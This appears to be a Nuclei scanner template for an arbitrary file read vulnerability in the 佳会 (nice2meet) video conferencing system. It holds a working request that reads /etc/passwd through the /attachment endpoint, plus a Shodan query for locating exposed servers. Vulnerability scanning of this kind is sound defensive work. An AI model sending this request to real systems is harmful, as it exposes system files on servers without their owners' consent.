id: nice2meet_attachment_FileRead

info:
  name: nice2meet_attachment_FileRead
  author: HK
  severity: high
  description: 佳会视频会议/attachment接口存在任意文件读取漏洞
  metadata:
    max-request: 1
    shodan-query: body="/user/get_app_scheme?site_id="
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /attachment?file=/etc/passwd HTTP/1.1
    Host: {{Hostname}}
    Connection: keep-alive
    Accept: */*
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
    Accept-Encoding: gzip, deflate, br, zstd
    Accept-Language: zh-CN,zh;q=0.9

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - root